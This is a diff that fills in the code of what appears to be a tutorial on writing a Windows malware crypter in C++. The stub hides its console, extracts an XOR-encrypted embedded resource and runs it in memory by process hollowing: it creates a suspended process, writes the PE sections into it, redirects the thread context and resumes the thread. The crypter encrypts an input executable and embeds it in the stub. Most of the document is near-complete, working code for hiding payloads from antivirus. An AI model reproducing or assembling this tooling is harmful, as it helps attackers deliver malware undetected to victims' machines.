@@ -56,12 +56,47 @@ the crypter holds our hardcoded stub we programmed before (as a template) and wr
 ## Lets code
 
 We start with the stub. first we create a function to find the encrypted resource. This is the file which will be attached later by our crypter. The first two parameters the function expects is the resource name and the resource type to find the code. 
-...
+```c++
+#include <iostream>
+#include <windows.h>
+
+unsigned char *GetResource(int resourceId, char* resourceString, unsigned long* dwSize) {
+    HGLOBAL hResData;
+    HRSRC   hResInfo;
+    unsigned char* pvRes;
+    HMODULE hModule = GetModuleHandle(NULL);
+
+    if (((hResInfo = FindResource(hModule, MAKEINTRESOURCE(resourceId), resourceString)) != NULL) &&
+        ((hResData = LoadResource(hModule, hResInfo)) != NULL) &&
+        ((pvRes = (unsigned char *)LockResource(hResData)) != NULL))
+    {
+        *dwSize = SizeofResource(hModule, hResInfo);
+        return 	pvRes;
+    }
+    // quit if no resource found
+    *dwSize = 0;
+    return 0;
+}
+```
 
 
 Now we write the main function. First we hide the console window. After that we call
-the GetResource function with our parameters and decrypt the returned coder byte by byte with XOR and our key (resource name "132", resource type "BIN", and the key "k" are freely selectable, but must be identical later in the crypter).
-...
+the GetResource function with our parameters and decrypt the returned code byte by byte with XOR and our key (resource name "132", resource type "BIN", and the key "k" are freely selectable, but must be identical later in the crypter).
+```c++
+int main() {
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+    // get embeded resource
+    unsigned long dwSize;
+    unsigned char* resourcePtr = GetResource(132, "BIN", &dwSize);
+
+
+    // decrypt the resource raw data
+    char key = 'k';
+    char decrypted[dwSize];
+    for (int i = 0; i < dwSize; i++)
+        decrypted[i] = resourcePtr[i] ^ key;
+```
 
 
 Finally we have to execute the decrypted code. Normally the OS Loader does all the work (mapping sections of an executable into memory, performing address relocation fix-ups if necessary, resolving function addresses and creating Import Address Table ... ) to execute a PE file correctly on the system. The difficulty here is that we are not running an executable from disk but from memory.
@@ -84,7 +119,82 @@ The important things we do here are:
 
 `ResumeThread`: resumes the thread of the suspended process.
 
-...
+```c++
+    void* pe = decrypted;
+
+    IMAGE_DOS_HEADER* DOSHeader;
+    IMAGE_NT_HEADERS64* NtHeader;
+    IMAGE_SECTION_HEADER* SectionHeader;
+
+    PROCESS_INFORMATION PI;
+    STARTUPINFOA SI;
+
+    void* pImageBase;
+
+    char currentFilePath[1024];
+
+    DOSHeader = PIMAGE_DOS_HEADER(pe);
+    NtHeader = PIMAGE_NT_HEADERS64(DWORD64(pe) + DOSHeader->e_lfanew);
+
+
+    if (NtHeader->Signature == IMAGE_NT_SIGNATURE) {
+        ZeroMemory(&PI, sizeof(PI));
+        ZeroMemory(&SI, sizeof(SI));
+
+        GetModuleFileNameA(NULL, currentFilePath, MAX_PATH);
+        // create new process for injection
+        if (CreateProcessA(currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
+
+            CONTEXT* CTX;
+            CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
+            CTX->ContextFlags = CONTEXT_FULL;
+
+            if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {
+                pImageBase = VirtualAllocEx(
+                        PI.hProcess,
+                        LPVOID(NtHeader->OptionalHeader.ImageBase),
+                        NtHeader->OptionalHeader.SizeOfImage,
+                        MEM_COMMIT | MEM_RESERVE,
+                        PAGE_EXECUTE_READWRITE
+                );
+
+
+                WriteProcessMemory(PI.hProcess, pImageBase, pe, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
+                // write pe sections
+                for (size_t i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
+                {
+                    SectionHeader = PIMAGE_SECTION_HEADER(DWORD64(pe) + DOSHeader->e_lfanew + 264 + (i * 40));
+
+                    WriteProcessMemory(
+                            PI.hProcess,
+                            LPVOID(DWORD64(pImageBase) + SectionHeader->VirtualAddress),
+                            LPVOID(DWORD64(pe) + SectionHeader->PointerToRawData),
+                            SectionHeader->SizeOfRawData,
+                            NULL
+                    );
+
+                    WriteProcessMemory(
+                            PI.hProcess,
+                            LPVOID(CTX->Rdx + 0x10),
+                            LPVOID(&NtHeader->OptionalHeader.ImageBase),
+                            8,
+                            NULL
+                    );
+
+                }
+
+                CTX->Rcx = DWORD64(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
+                SetThreadContext(PI.hThread, LPCONTEXT(CTX));
+                ResumeThread(PI.hThread);
+
+                WaitForSingleObject(PI.hProcess, NULL);
+
+                return 0;
+            }
+        }
+    }
+}
+```
 
 We compile the program in release mode and our stub is ready!
 
@@ -92,19 +202,111 @@ We compile the program in release mode and our stub is ready!
 Now we have to write our crypter. Our crypter is also a CLI application so we read our input PE (the file we want to encrypt) as argument.
 We also create a byte array as a placeholder for the raw code of our compiled stub.
 We change this at the end otherwise our IDE will lag or be functionally compromised because the byte array will be very large.
-...
+```c++
+#include <iostream>
+#include <windows.h>
+#include <fstream>
+
+using namespace std;
+
+unsigned char rawData[] = {};
+
+
+int main(int argc, char* argv[]) {
+
+    if (argc < 2) {
+        cout << "Error: Start this program with arguments." << endl;
+        system("pause");
+        return 0;
+    }
+    
+    const char *resFile = argv[1];
+
+    // read input file
+    FILE *fileptr;
+    char *fileBuff;
+    long filelen;
+
+    fileptr = fopen(resFile, "rb"); // Open the file in binary mode
+    fseek(fileptr, 0, SEEK_END);    // jump to the end of the file
+    filelen = ftell(fileptr);   // get the current byte offset in the file
+    rewind(fileptr);    // jump back to the beginning of the file
+
+    fileBuff = (char *)malloc(filelen * sizeof(char));  // alloc memory for the file
+    fread(fileBuff, filelen, 1, fileptr);   // read in the entire file
+    fclose(fileptr);
+```
+    
 
 Now we check the header of the image to make sure we are working with a x64 PE.
-...
+```c++
+cout << "Validate input file as x64 PE... ";
+    IMAGE_DOS_HEADER* _dosHeader = (PIMAGE_DOS_HEADER) fileBuff;
+    IMAGE_NT_HEADERS64* _ntHeader = PIMAGE_NT_HEADERS64)(DWORD64(fileBuff) + _dosHeader->e_lfanew);
+    bool is64 = _ntHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64;
+    if (!is64) {
+        cout << "Error. Input file is not a valid x64 PE" << endl;
+        system("pause");
+        return 0;
+    }
+  ```
 
 And we encrypt the data with XOR and the key "k" exactly like in the stub before.
-...
+```c++
+    char key = 'k';
+    char encrypted[filelen];
+    for (int i = 0; i < filelen; i++)
+        encrypted[i] = fileBuff[i] ^ key;
+```
 
 Our crypter must now write the stub to disk.
-...
+```c++
+    fstream bin ("Stub.exe",ios :: out | ios :: binary);
+    if (!bin.write(reinterpret_cast<const char *>(rawData), sizeof(rawData))) {
+        cout << "Error: Could not write the stub to disk" << endl;
+        system("pause");
+        return 0;
+    }
+    bin.close();
+```
 
 Now we have to add the encrypted data as resource to our stub. For this we use `BeginUpdateResource`, `UpdateResource` and `EndUpdateResource`. As I mentioned before we have to make sure that we use the same resource name and resource type as in the stub. Otherwise our stub program will not find a resource to work with.
-...
+```c++
+    HANDLE hUpdateRes;
+    BOOL result;
+
+    hUpdateRes = BeginUpdateResource("Stub.exe", FALSE);
+    if (hUpdateRes == NULL)
+    {
+        cout << "Error: Could not open file for writing" << endl;
+        system("pause");
+        return 0;
+    }
+
+    result = UpdateResource(hUpdateRes,                  // update resource handle
+                            "BIN",                       // resource ID
+                            MAKEINTRESOURCE(132),        // resource name
+                            NULL,
+                            encrypted,                   // ptr to encrypted resource
+                            filelen);                    // size of resource
+
+    if (result == FALSE)
+    {
+        cout << "Error: Could not add resource" << endl;
+        system("pause");
+        return 0;
+    }
+
+    // write changes and then close
+    if (!EndUpdateResource(hUpdateRes, FALSE))
+    {
+        cout << "Error: Could not write changes to file" << endl;
+        system("pause");
+        return 0;
+    }
+    return 0;
+}
+```
 
 Before compiling we insert the raw code as byte array into our code.
 I use the HxD hexeditor to open my stub.exe and export the raw code to a .c file.
